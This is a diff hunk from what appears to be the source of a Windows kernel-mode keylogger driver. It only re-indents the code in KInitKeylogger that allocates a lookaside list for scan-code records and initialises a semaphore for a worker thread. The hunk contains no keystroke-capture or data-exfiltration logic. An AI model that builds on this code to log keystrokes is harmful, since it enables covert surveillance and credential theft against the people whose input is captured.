@@ -85,20 +85,17 @@ KInitKeylogger(
 
 	/* use a lookaside list to keep tabs on the keys entered*/ 
 	DeviceExt->LookasideList = (PNPAGED_LOOKASIDE_LIST) ExAllocatePoolWithTag(NonPagedPool,
-																			  sizeof(NPAGED_LOOKASIDE_LIST),
-																			  KEXP_TAG);
+										  sizeof(NPAGED_LOOKASIDE_LIST),
+										  KEXP_TAG);
 	ExInitializeNPagedLookasideList(DeviceExt->LookasideList,
-									nullptr,
-									nullptr,
-									POOL_NX_ALLOCATION,
-									sizeof(KKeylogger::ScanCodes::KEY_CODE_DATA),
-									KEXP_TAG,
-									0);
+					nullptr,
+					nullptr,
+					POOL_NX_ALLOCATION,
+					sizeof(KKeylogger::ScanCodes::KEY_CODE_DATA),
+					KEXP_TAG,
+					0);
 	/* for communication w/ the WorkerThread */
-	KeInitializeSemaphore(&DeviceExt->SemaphoreLock, 
-						  0l, 
-						  MAXLONG);
-
+	KeInitializeSemaphore(&DeviceExt->SemaphoreLock,  0l,  MAXLONG);
  
 	return Status;
 }
